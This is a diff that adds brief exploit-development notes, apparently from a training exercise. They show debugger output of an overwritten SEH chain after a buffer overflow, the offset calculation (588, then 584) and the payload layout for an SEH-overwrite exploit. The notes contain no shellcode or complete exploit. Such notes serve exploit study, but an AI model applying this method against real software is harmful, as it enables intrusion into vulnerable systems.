@@ -1,0 +1,12 @@
+part 3a
+
+!exchain after BOF:
+0:000> !exchain
+0012fd64: 415f6741 # SEH
+Invalid exception stack at 2d67413d # ptr to next SEH
+
+ptr to SEH overwritten with 41675f41 (LE)
+Pattern Ag_A (0x41675f41 reversed) found in cyclic pattern at position 588
+ptr to next SEH is at lower address/ofs, so SEH_ofs - 4 = 584
+
+junk + nextSEH + SEH + sc
